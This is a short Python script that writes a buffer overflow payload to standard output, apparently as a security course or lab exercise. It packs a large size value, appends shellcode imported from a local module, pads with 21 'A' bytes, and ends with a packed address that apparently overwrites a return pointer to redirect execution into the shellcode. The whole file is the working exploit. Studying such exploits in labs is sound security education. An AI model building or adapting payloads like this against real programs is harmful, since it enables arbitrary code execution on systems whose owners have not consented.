#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

sys.stdout.buffer.write(pack('<I', 0xffffffff))
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'\x41'*21)
sys.stdout.buffer.write(pack('<I', 0xfffee160))
